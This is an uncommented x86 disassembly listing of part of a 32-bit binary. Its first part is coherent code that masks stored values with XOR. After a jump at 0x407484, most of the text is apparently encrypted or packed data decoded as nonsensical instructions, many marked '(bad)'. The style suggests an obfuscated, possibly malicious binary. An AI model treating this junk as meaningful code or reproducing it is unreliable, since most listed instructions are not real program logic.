  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	out    dx,eax
  407496:	mov    edi,?
  407498:	push   esi
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074ba
  4074a2:	test   al,0xd3
  4074a4:	sub    BYTE PTR [ebx],0xf5
  4074a7:	push   0xffffffc6
  4074a9:	add    edi,DWORD PTR [eax+edi*1]
  4074ac:	fidivr DWORD PTR [eax]
  4074ae:	and    eax,0x221cd75a
  4074b3:	jmp    0x2666:0x138fb345
  4074ba:	sahf   
  4074bb:	stc    
  4074bc:	xor    edi,ebp
  4074be:	and    eax,0xccbdc091
  4074c3:	fidiv  DWORD PTR [esi+edx*4+0x5025237f]
  4074ca:	mov    eax,ds:0x358e37cd
  4074cf:	ins    BYTE PTR es:[edi],dx
  4074d0:	or     BYTE PTR [eax],ah
  4074d2:	sub    al,0x73
  4074d4:	frstor [edi+0x5a]
  4074d7:	call   0xe11e1950
  4074dc:	lds    edx,FWORD PTR [esi-0x20]
  4074df:	cli    
  4074e0:	add    al,0xd3
  4074e2:	arpl   si,bp
  4074e4:	mov    ss,WORD PTR ss:[ecx+0x5e]
  4074e8:	mov    DWORD PTR [eax],esi
  4074ea:	adc    al,0x7b
  4074ec:	sub    ecx,edx
  4074ee:	or     dl,BYTE PTR [ebx]
  4074f0:	push   ebp
  4074f1:	leave  
  4074f2:	xchg   edx,eax
  4074f3:	jge    0x4074b1
  4074f5:	leave  
  4074f6:	jno    0x40751e
  4074f8:	jmp    FWORD PTR [esi]
  4074fa:	cmc    
  4074fb:	and    BYTE PTR [ecx-0xd127002],ch
  407501:	leave  
  407502:	jne    0x407582
  407504:	fdivr  QWORD PTR [edx-0xc]
  407507:	or     al,BYTE PTR [eax]
  407509:	dec    edi
  40750a:	and    eax,0xbcc1ca2a
  40750f:	mov    dl,cl
  407511:	jae    0x4074b3
  407513:	imul   ebp,esi,0x2bd2f585
  407519:	nop
  40751a:	lds    ebx,FWORD PTR [edx]
  40751c:	jecxz  0x4074e8
  40751e:	push   0xb3eb5e7
  407523:	jmp    0x241e2cd5
  407528:	and    al,0xc7
  40752a:	mov    eax,ds:0xf5960165
  40752f:	popf   
  407530:	aam    0xb8
  407532:	and    DWORD PTR [esi],0x7f
  407535:	pop    ebp
  407536:	sahf   
  407537:	fsub   DWORD PTR [eax-0x6a2b8060]
  40753d:	mov    bh,0x58
  40753f:	sahf   
  407540:	dec    ebp
  407541:	pop    ds
  407542:	mov    ah,0x3d
  407544:	sahf   
  407545:	dec    edi
  407546:	std    
  407547:	inc    eax
  407548:	pop    ebp
  407549:	retf   
  40754a:	mov    eax,ds:0x174b9c93
  40754f:	das    
  407550:	adc    al,BYTE PTR [edi-0x2f]
  407553:	dec    edx
  407554:	pop    ds
  407555:	mov    ebx,0xf9bfdfbf
  40755a:	push   cs
  40755b:	pop    ebp
  40755c:	dec    ecx
  40755d:	adc    DWORD PTR [edx+0x2a3b2a61],edx
  407563:	pushf  
  407564:	aam    0xeb
  407566:	pop    ebp
  407567:	call   0x355f:0x26b4bdbf
  40756e:	pop    esi
  40756f:	out    0x9f,eax
  407571:	mov    ch,0x25
  407573:	push   0xbedd51af
  407578:	push   ebp
  407579:	mov    edi,0x50f379e2
  40757e:	ins    BYTE PTR es:[edi],dx
  40757f:	sar    DWORD PTR [ecx-0x62],cl
  407582:	retf   
  407583:	retf   0xbb6b
  407586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407587:	dec    ebp
  407588:	test   DWORD PTR [ecx],ebx
  40758a:	fstp   st(2)
  40758c:	jle    0x4075c9
  40758e:	popf   
  40758f:	xor    edi,DWORD PTR [eax-0x1923b394]
  407595:	data16 (bad) 
  407597:	pop    es
  407598:	mov    al,ds:0x8210627b
  40759d:	or     al,0x13
  40759f:	cmp    dl,BYTE PTR [esi]
  4075a1:	(bad)  
  4075a3:	sub    al,0x3d
  4075a5:	retf   
  4075a6:	sbb    al,0x57
  4075a8:	sub    BYTE PTR [ebp+0x28adf64f],0xdd
  4075af:	not    BYTE PTR [ebx-0x1c]
  4075b2:	inc    ebp
  4075b3:	xor    eax,0xb8a321be
  4075b8:	and    esi,ebp
  4075ba:	xchg   DWORD PTR [edi],esi
  4075bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075bd:	dec    ebx
  4075be:	aas    
  4075bf:	jo     0x4075d2
  4075c1:	repz scas al,BYTE PTR es:[edi]
  4075c3:	pusha  
  4075c4:	ror    BYTE PTR [edx+0x6016d3d0],cl
  4075ca:	fs hlt 
  4075cc:	xchg   DWORD PTR [eax],esp
  4075ce:	call   DWORD PTR [edi+0x3]
  4075d1:	jle    0x4075f2
  4075d3:	std    
  4075d4:	in     al,0xb3
  4075d6:	in     eax,0xc7
  4075d8:	stc    
  4075d9:	mov    al,0x82
  4075db:	xchg   ebx,eax
  4075dc:	cld    
  4075dd:	mov    esi,0xb32bd30b
  4075e2:	push   esp
  4075e3:	sbb    dl,dl
  4075e5:	sbb    ebx,DWORD PTR [edi-0x2e]
  4075e8:	out    dx,eax
  4075e9:	fdiv   st(2),st
  4075eb:	jb     0x407614
  4075ed:	data16 jg 0x4075ee
  4075f0:	out    0x8c,al
  4075f2:	xchg   edx,eax
  4075f3:	icebp  
  4075f4:	aas    
  4075f5:	sbb    al,0x1f
  4075f7:	xor    DWORD PTR [ebx-0x58],0x2ffb6701
  4075fe:	inc    edx
  4075ff:	sub    DWORD PTR [edi-0xe84d9ab],ebx
  407605:	test   eax,0xc2113e93
  40760a:	outs   dx,DWORD PTR ds:[esi]
  40760b:	add    BYTE PTR [edi+esi*2-0x45],al
  40760f:	sub    DWORD PTR [edx+ebx*4+0x9],esi
  407613:	fwait
  407614:	mov    DWORD PTR ds:0xc05a61f9,eax
  40761a:	cmp    BYTE PTR [bp+si-0x1f4a],ah
  40761f:	jg     0x407664
  407621:	mov    WORD PTR [esi+0x3562036],cs
  407627:	pop    es
  407628:	push   eax
  407629:	mov    bl,0x5b
  40762b:	jecxz  0x4076a5
  40762d:	pop    edx
  40762e:	loop   0x4075c3
  407630:	xlat   BYTE PTR ds:[ebx]
  407631:	int3   
  407632:	mov    edi,0x7c50d54e
  407637:	jp     0x4075c0
  407639:	mov    bh,bh
  40763b:	mov    ebp,?
  40763d:	leave  
  40763e:	cmp    al,0x99
  407640:	push   ebx
  407641:	leave  
  407642:	push   esi
  407643:	call   0xa46a:0x918c64f1
  40764a:	rcl    dl,1
  40764c:	lods   eax,DWORD PTR ds:[esi]
  40764d:	les    ecx,FWORD PTR [edi-0x3aec2f8e]
  407653:	xor    al,BYTE PTR [ebx-0x2971e8c3]
  407659:	jb     0x4076b9
  40765b:	lahf   
  40765c:	les    ecx,FWORD PTR [ebp+0x49720389]
  407662:	and    ecx,DWORD PTR [ebp+ebx*2-0x609edc75]
  407669:	or     eax,0xac5a51f
  40766e:	xchg   ah,bl
  407670:	or     BYTE PTR [ebp+0x2bb5c26e],cl
  407676:	jne    0x407602
  407678:	je     0x40764d
  40767a:	fmul   DWORD PTR [eax+0x56e8a707]
  407680:	push   0xfffffff5
  407682:	je     0x4076d8
  407684:	sbb    ah,al
  407686:	inc    edi
  407687:	retf   
  407688:	mov    al,0x7d
  40768a:	pop    eax
  40768b:	int    0xee
  40768d:	cmp    bh,dl
  40768f:	pop    eax
  407690:	shr    DWORD PTR [eax],1
  407692:	in     al,0xcf
  407694:	out    dx,al
  407695:	inc    edi
  407696:	fsub   QWORD PTR [eax]
  407698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407699:	mov    cl,0x25
  40769b:	scas   al,BYTE PTR es:[edi]
  40769c:	dec    ecx
  40769d:	pop    edx
  40769e:	dec    esp
  40769f:	icebp  
  4076a0:	data16 jle 0x4076d8
  4076a3:	mov    ?,WORD PTR [ecx-0x1]
  4076a6:	mov    ch,ah
  4076a8:	cmp    BYTE PTR [ebx+0x31],bh
  4076ab:	xchg   edi,eax
  4076ac:	cld    
  4076ad:	in     al,dx
  4076ae:	jl     0x40766e
  4076b0:	jo     0x40763f
  4076b2:	mov    cl,0x8f
  4076b4:	loope  0x407718
  4076b6:	cmc    
  4076b7:	dec    esi
  4076b8:	out    0xfc,eax
  4076ba:	and    edx,DWORD PTR [ebx+0x346a3dc6]
  4076c0:	in     al,0x6
  4076c2:	push   0xf4be861c
  4076c7:	xchg   esp,eax
  4076c8:	push   es
  4076c9:	mov    dl,0x55
  4076cb:	scas   al,BYTE PTR es:[edi]
  4076cc:	pushf  
  4076cd:	pop    esp
  4076ce:	xor    al,0xa5
  4076d0:	mov    eax,0x669a178c
  4076d5:	sbb    eax,0xb04e3b1d
  4076da:	cdq    
  4076db:	add    bl,BYTE PTR [esi+0x73afc2cf]
  4076e1:	and    al,0x81
  4076e3:	inc    edx
  4076e4:	adc    DWORD PTR [ebx+0x40],0x32
  4076e8:	retf   0x1e2d
  4076eb:	push   ecx
  4076ec:	sub    DWORD PTR [eax-0xb],0x40
  4076f0:	jle    0x4076c1
  4076f2:	xchg   ebx,eax
  4076f3:	(bad)  
  4076f4:	nop
  4076f5:	out    dx,al
  4076f6:	lock push es
  4076f8:	vmread DWORD PTR [edi-0x8],esi
  4076fc:	and    eax,0xfc390ceb
  407701:	adc    eax,edx
  407703:	sahf   
  407704:	mov    ecx,0xbdae1984
  407709:	aas    
  40770a:	sbb    bl,bh
  40770c:	rcl    BYTE PTR [edx+ecx*1],0xdb
  407710:	fadd   QWORD PTR [eax+eiz*4]
  407713:	(bad)  
  407714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407715:	test   esp,0xe7442b67
  40771b:	adc    bl,BYTE PTR [edi-0x12]
  40771e:	les    esp,FWORD PTR [edi+ecx*1-0x30]
  407722:	sbb    eax,0x873fba03
  407727:	sti    
  407728:	xor    al,0x83
  40772a:	dec    edi
  40772b:	leave  
  40772c:	bound  esi,QWORD PTR [edi]
  40772e:	xor    al,0x70
  407730:	and    DWORD PTR [esi-0x2c],edi
  407733:	test   eax,0xd76bb112
  407738:	into   
  407739:	and    dh,BYTE PTR [ecx+ebx*2+0x22628f63]
  407740:	dec    edx
  407741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407742:	int3   
  407743:	xchg   ecx,eax
  407744:	shl    BYTE PTR [ecx+0x44],1
  407747:	leave  
  407748:	fs (bad) 
  40774a:	aad    0x90
  40774c:	cmp    DWORD PTR [esp+edi*4-0x1f],0xffffffae
  407751:	and    BYTE PTR [esi-0x4b],0x17
  407755:	pop    es
  407756:	push   esi
  407757:	lods   eax,DWORD PTR ds:[esi]
  407758:	cmc    
  407759:	inc    edi
  40775a:	xchg   bh,dh
  40775c:	xchg   edi,esi
  40775e:	or     eax,0x342fec7d
  407763:	push   ds
  407764:	scas   eax,DWORD PTR es:[edi]
  407765:	fldpi  
  407767:	aaa    
  407768:	ds xchg edx,eax
  40776a:	fisub  WORD PTR [edi+eiz*8+0x53]
  40776e:	popf   
  40776f:	xchg   BYTE PTR [ebp*2-0x5d99394c],ah
  407776:	in     al,dx
  407777:	dec    eax
  407778:	aad    0xbf
  40777a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40777b:	cdq    
  40777c:	aam    0x65
  40777e:	xor    BYTE PTR [ebx-0x65],dh
  407781:	xor    DWORD PTR [edi+0xdc3f19d],edx
  407787:	lock retf 0xc238
  40778b:	cmp    al,0xfc
  40778d:	test   eax,0x44d6dd7f
  407792:	sub    edi,edx
  407794:	loopne 0x4077f7
  407796:	fprem  
  407798:	add    eax,0x33870d90
  40779d:	pop    ds
  40779e:	dec    ebp
  40779f:	cmp    al,0xd4
  4077a1:	mov    al,ds:0x560de832
  4077a6:	imul   ecx,DWORD PTR [edx-0x43],0xffffff95
  4077aa:	sbb    al,0xab
  4077ac:	sbb    DWORD PTR [eax],0xffffff8c
  4077af:	gs iret 
  4077b1:	or     BYTE PTR [ecx],ch
  4077b3:	jp     0x407752
  4077b5:	cmp    edi,DWORD PTR [eax]
  4077b7:	push   ds
  4077b8:	js     0x4077d5
  4077ba:	mov    BYTE PTR [esi+0x58],bl
  4077bd:	pop    ds
  4077be:	xchg   ebx,eax
  4077bf:	sub    BYTE PTR [ebp-0x70],cl
  4077c2:	repz push ds
  4077c4:	push   ebp
  4077c5:	mov    edi,DWORD PTR [ebx+eax*2+0x59]
  4077c9:	adc    ah,bl
  4077cb:	je     0x4077ed
  4077cd:	pop    ss
  4077ce:	cmp    eax,0xc7fc4d8b
  4077d3:	add    eax,0x4337a7
  4077d8:	gs pop esi
  4077da:	add    BYTE PTR [eax],al
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	dec    ebp
  4077f6:	inc    edx
  4077f7:	pop    es
  4077f8:	push   esi
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x407859
  407801:	sub    BYTE PTR [ecx-0x24],bl
  407804:	fld    st(7)
  407806:	xchg   edx,eax
  407807:	dec    edx
  407808:	push   cs
  407809:	or     BYTE PTR [esi],bl
  40780b:	shl    BYTE PTR [ecx-0x3c],cl
  40780e:	popa   
  40780f:	sar    DWORD PTR [ebp-0x6c],0x1c
  407813:	inc    esp
  407814:	mov    eax,ds:0x754144be
  407819:	jp     0x4077d0
  40781b:	lock arpl WORD PTR [esi-0x454ee6c3],cx
  407822:	push   ds
  407823:	pushf  
  407824:	or     al,0x8c
  407826:	std    
  407827:	aas    
  407828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407829:	jp     0x407801
  40782b:	rcr    dh,cl
  40782d:	and    eax,DWORD PTR [edi-0xe9f2aa9]
  407833:	mov    edi,0x20dfb9b4
  407838:	push   esi
  407839:	sbb    ebx,ebx
  40783b:	jnp    0x407899
  40783d:	push   ebp
  40783e:	pop    edx
  40783f:	push   ecx
  407840:	outs   dx,BYTE PTR ds:[esi]
  407841:	sbb    DWORD PTR [edi-0x48],ebp
  407844:	in     al,0x52
  407846:	mov    bh,0x5a
  407848:	add    eax,0xe214aecf
  40784d:	mov    esi,0xbeeb9cc8
  407852:	lahf   
  407853:	pop    ss
  407854:	jl     0x407863
  407856:	adc    dh,BYTE PTR [eax-0x6e]
  407859:	add    edx,DWORD PTR [ebx]
  40785b:	pop    es
  40785c:	jl     0x4078d9
  40785e:	push   ecx
  407860:	mov    dh,0xe9
  407862:	mov    dl,0x5b
  407864:	xor    BYTE PTR [esp+ebp*8],ch
  407867:	imul   esp,DWORD PTR [eax-0x29],0x7bc6dd80
  40786e:	ins    BYTE PTR es:[edi],dx
  40786f:	mov    edx,0x2a8dfb7e
  407874:	pop    ds
  407875:	push   ebp
  407876:	adc    bh,ah
  407878:	jne    0x4078f1
  40787a:	mov    ch,BYTE PTR [edx+edx*4+0x64]
  40787e:	movhps xmm2,QWORD PTR [esp+edx*8-0x3f]
  407883:	(bad)  
  407884:	or     al,0x21
  407886:	outs   dx,DWORD PTR ds:[esi]
  407887:	out    0xd7,eax
  407889:	mov    al,0x12
  40788b:	fs sub esp,esi
  40788e:	retf   0x4322
  407891:	mov    ds:0xc58176c9,al
  407896:	fidivr DWORD PTR [ebx+0x4a77111c]
  40789c:	in     eax,0xe3
  40789e:	and    esp,DWORD PTR [esi+0x4c190c68]
  4078a4:	mov    bl,0x83
  4078a6:	push   edx
  4078a7:	fadd   DWORD PTR [edx-0x3c553885]
  4078ad:	das    
  4078ae:	retf   0x44a
  4078b1:	rcl    BYTE PTR [edx-0x7f],0xb2
  4078b5:	rol    BYTE PTR [eax+0x62],1
  4078b8:	inc    ebx
  4078b9:	jb     0x4078c3
  4078bb:	jae    0x4078d0
  4078bd:	ret    
  4078be:	rcr    ebp,cl
  4078c0:	adc    dl,BYTE PTR [ecx+edx*8-0x1211b81c]
  4078c7:	push   0x91a97685
  4078cc:	sub    al,BYTE PTR [esi-0x78366065]
  4078d2:	mov    ch,0x57
  4078d4:	enter  0xbc44,0xb0
  4078d8:	xor    BYTE PTR [eax-0x1a10765a],0x40
  4078df:	mov    bl,0x3d
  4078e1:	cdq    
  4078e2:	sub    DWORD PTR [esi],ebx
  4078e4:	fimul  DWORD PTR [bx+di-0x6a]
  4078e8:	fisubr DWORD PTR [eax]
  4078ea:	add    esi,DWORD PTR [ebp-0x537caac0]
  4078f0:	dec    ecx
  4078f1:	mov    cl,0xeb
  4078f3:	push   edi
  4078f4:	xor    esp,DWORD PTR [eax+0x34]
  4078f7:	or     bl,BYTE PTR [esi]
  4078f9:	cmp    bh,BYTE PTR [ebp+0x36919a40]
  4078ff:	jne    0x407948
  407901:	sub    eax,0x989e5591
  407906:	enter  0xfefa,0x45
  40790a:	adc    eax,DWORD PTR [ebp-0x21]
  40790d:	xchg   esp,eax
  40790e:	xor    al,0xd7
  407910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407911:	popf   
  407912:	aaa    
  407913:	xchg   DWORD PTR [eax+eax*8],esp
  407916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407917:	adc    al,0x7e
  407919:	push   eax
  40791a:	add    al,0x1d
  40791c:	xchg   edx,eax
  40791d:	data16 mov dh,0xdf
  407920:	aad    0x3a
  407922:	fsin   
  407924:	cli    
  407925:	and    BYTE PTR [ecx+0x5f],bh
  407928:	ins    BYTE PTR es:[edi],dx
  407929:	pop    ss
  40792a:	sub    BYTE PTR [ebp-0x42],dh
  40792d:	xchg   ebx,eax
  40792e:	xchg   esi,eax
  40792f:	xchg   DWORD PTR [eax-0x35c1f613],ebp
  407935:	pop    esp
  407936:	lds    edi,FWORD PTR [bp+si]
  407939:	ds push ss
  40793b:	mov    ch,0x70
  40793d:	scas   al,BYTE PTR es:[edi]
  40793e:	fwait
  40793f:	das    
  407940:	scas   al,BYTE PTR es:[edi]
  407941:	ins    DWORD PTR es:[edi],dx
  407942:	outs   dx,DWORD PTR ds:[esi]
  407943:	frstor [eax+0x7ade0bf8]
  407949:	in     eax,0x41
  40794b:	adc    bh,BYTE PTR [eax+0x60]
  40794e:	lds    ecx,FWORD PTR [edx]
  407950:	add    BYTE PTR [esi-0x5052b770],ah
  407956:	push   ebx
  407957:	xor    ch,BYTE PTR [ebx]
  407959:	test   eax,0xc96292e7
  40795e:	adc    eax,0xb04279f4
  407963:	inc    edx
  407964:	push   ecx
  407965:	sbb    ch,0x88
  407968:	xchg   DWORD PTR [edi],esi
  40796a:	adc    al,0x39
  40796c:	test   eax,0x45b34fe9
  407971:	(bad)
  407974:	fistp  DWORD PTR [ecx-0x48]
  407977:	sbb    eax,DWORD PTR [ebx]
  407979:	or     BYTE PTR [ecx+0x3ac5ef97],ah
  40797f:	push   0x11
  407981:	sbb    DWORD PTR [ebp-0x29],esi
  407984:	xor    cl,BYTE PTR [edx+0x7d4ca42f]
  40798a:	cmp    BYTE PTR [ecx],al
  40798c:	push   es
  40798d:	cmp    eax,0xc21f475c
  407992:	or     DWORD PTR [eax+0x34eb2817],esi
  407998:	ja     0x407a05
  40799a:	dec    ecx
  40799b:	sub    cl,dl
  40799d:	cmp    DWORD PTR [eax-0x4e36052b],ebx
  4079a3:	shl    DWORD PTR [eax+0xd25d1e5],cl
  4079a9:	stos   DWORD PTR es:[edi],eax
  4079aa:	xchg   esi,eax
  4079ab:	pop    ecx
  4079ac:	push   edx
  4079ad:	lds    ebx,FWORD PTR [eax+0x5116fa9f]
  4079b3:	mov    edx,0xca599358
  4079b8:	or     ch,dh
  4079ba:	stc    
  4079bb:	call   0x1bee68f0
  4079c0:	sahf   
  4079c1:	and    BYTE PTR [edi+0x1de443ec],0x71
  4079c8:	sbb    eax,0x6c95908e
  4079cd:	inc    edx
  4079ce:	add    eax,0x7a4ae683
  4079d3:	and    BYTE PTR [ebp+0x38],dl
  4079d6:	repnz data16 shr BYTE PTR [ebp+0x40c20110],1
  4079de:	mov    edx,0x9ca1944
  4079e3:	add    eax,0x77b0139a
  4079e8:	ret    
  4079e9:	jno    0x407a62
  4079eb:	rol    DWORD PTR [edx-0x35],0x14
  4079ef:	jl     0x4079b7
  4079f1:	lock inc DWORD PTR es:[si-0x53e2]
  4079f8:	(bad)  
  4079f9:	dec    DWORD PTR [eax*2+0x2c963559]
  407a00:	sbb    DWORD PTR [eax+0x7128076b],edx
  407a06:	mov    bl,0x8a
  407a08:	add    BYTE PTR [eax+0x17],al
  407a0b:	xor    ebx,esi
  407a0d:	pusha  
  407a0e:	push   ebx
  407a0f:	std    
  407a10:	nop
  407a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a12:	lock dec esp
  407a14:	mov    dh,0xa6
  407a16:	cwde   
  407a17:	daa    
  407a18:	pop    ebp
  407a19:	xlat   BYTE PTR ds:[ebx]
  407a1a:	enter  0x28fd,0x85
  407a1e:	jae    0x407a89
  407a20:	fst    QWORD PTR [edx-0x1d]
  407a23:	inc    ebp
  407a24:	sub    ch,bl
  407a26:	retf   
  407a27:	fld    QWORD PTR [eax+0x41]
  407a2a:	popa   
  407a2b:	mov    ecx,0x570bb074
  407a30:	test   eax,0x586cd70f
  407a35:	fdiv   st(5),st
  407a37:	inc    ebp
  407a38:	inc    edi
  407a39:	jb     0x4079d9
  407a3b:	dec    eax
  407a3c:	scas   al,BYTE PTR es:[edi]
  407a3d:	in     eax,0xb1
  407a3f:	mov    DWORD PTR [ebx],edx
  407a41:	mov    esp,0xc1dcbc32
  407a46:	fist   DWORD PTR [edi-0x32300952]
  407a4c:	xor    cl,BYTE PTR es:[ecx+ebx*4+0x3ae20aa1]
  407a54:	lea    ebp,[edx+0x1a]
  407a57:	mov    eax,ds:0xa2d69297
  407a5c:	scas   al,BYTE PTR es:[edi]
  407a5d:	clc    
  407a5e:	loope  0x407a52
  407a60:	test   al,0xf0
  407a62:	sbb    ebp,DWORD PTR [esi-0x5638c47b]
  407a68:	sub    esi,DWORD PTR [esi]
  407a6a:	outs   dx,BYTE PTR ds:[esi]
  407a6b:	out    0xbe,eax
  407a6d:	push   ds
  407a6e:	inc    ebx
  407a6f:	pop    esp
  407a70:	jns    0x407a6b
  407a72:	push   0xacd80100
  407a77:	pop    esp
  407a78:	adc    BYTE PTR [ecx],0x4b
  407a7b:	add    al,cl
  407a7d:	xor    ebp,esp
  407a7f:	xchg   BYTE PTR [edi],bh
  407a81:	sbb    DWORD PTR [ebp+0x1a8e74bd],0x7b730388
  407a8b:	push   ss
  407a8c:	(bad)  
  407a8d:	outs   dx,BYTE PTR ds:[esi]
  407a8e:	fldenv [edi]
  407a90:	adc    BYTE PTR [ebx+0x3b6874c7],cl
  407a96:	push   es
  407a97:	pop    edi
  407a98:	sbb    dl,BYTE PTR [ecx]
  407a9a:	push   ss
  407a9b:	xchg   edx,eax
  407a9c:	popa   
  407a9d:	jne    0x407b08
  407a9f:	adc    BYTE PTR [ecx+0x7ec2d56d],dl
  407aa5:	cmp    bl,cl
  407aa7:	pushf  
  407aa8:	jl     0x407abc
  407aaa:	inc    edi
  407aab:	jb     0x407a62
  407aad:	in     eax,0x37
  407aaf:	repz push edi
  407ab1:	outs   dx,DWORD PTR ds:[esi]
  407ab2:	ins    DWORD PTR es:[edi],dx
  407ab3:	in     eax,dx
  407ab4:	(bad)  
  407ab5:	cwde   
  407ab6:	dec    ebx
  407ab7:	add    esp,edx
  407ab9:	add    cl,al
  407abb:	xor    ah,BYTE PTR [edi-0x1c]
  407abe:	pop    ebx
  407abf:	and    ebx,esi
  407ac1:	cmp    DWORD PTR [ebx+0x65],eax
  407ac4:	push   edx
  407ac5:	int3   
  407ac6:	push   edx
  407ac7:	jp     0x407ae9
  407ac9:	hlt    
  407aca:	inc    esp
  407acb:	mov    esp,0xebc8168e
  407ad0:	and    BYTE PTR [eax+edi*1+0x6],ch
  407ad4:	dec    eax
  407ad5:	and    esp,ebp
  407ad7:	(bad)  
  407ad8:	std    
  407ad9:	pop    es
  407ada:	and    ecx,DWORD PTR [ebx+0x2c]
  407add:	pop    esi
  407ade:	sbb    al,0x47
  407ae0:	lods   al,BYTE PTR ss:[esi]
  407ae2:	ja     0x407b50
  407ae4:	cmp    DWORD PTR [edi-0x4a31b333],eax
  407aea:	pop    esi
  407aeb:	mov    dh,0xf8
  407aed:	cmp    al,0x82
